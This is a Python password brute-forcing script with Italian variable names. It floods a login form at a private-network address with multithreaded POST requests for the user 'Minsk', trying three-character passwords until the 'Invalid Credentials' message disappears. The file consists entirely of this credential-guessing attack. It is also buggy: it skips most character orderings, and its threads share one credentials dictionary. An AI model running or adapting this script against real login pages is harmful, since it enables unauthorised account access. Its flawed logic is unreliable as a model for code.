import requests
import string
from itertools import combinations_with_replacement
import threading
import numpy as np
from py_console import console

N_CARATTERI_PASSWORD = 3
N_THREAD = 62
caratteri_possibili = list(string.ascii_lowercase + string.digits + string.ascii_uppercase)
np.random.shuffle(caratteri_possibili)

running = threading.Lock()

credenziali = {
    "username" : "Minsk",
    "password": ""
}

#26+26+10 = ?
class Prova(threading.Thread):
    def __init__(self, lista_prime_cifre, cred):
        threading.Thread.__init__(self)
        self.liste_prime_cifre = lista_prime_cifre
        self.credenziali = cred
    
        
    def run(self):
        for prima_cifra in self.liste_prime_cifre:
            for combinazione in combinations_with_replacement(caratteri_possibili, N_CARATTERI_PASSWORD-1):
                c = prima_cifra+''.join(combinazione)
                console.warn(f"Combinazione provata: {c}")
                self.credenziali["password"] = c
                r = requests.post('http://192.168.0.129:5000/', data=self.credenziali)

                if "Invalid Credentials" not in str(r.content):
                    console.success(f"la password corretta è {c}")
                    running.acquire()

                if running.locked():
                    break
def main():
    n_combinazioni = len(caratteri_possibili)//N_THREAD

    lista_thread = [Prova(caratteri_possibili[n_combinazioni*n:n_combinazioni*(n+1)], credenziali).start() for n in range(N_THREAD)]

    

if __name__ == "__main__":
    main()


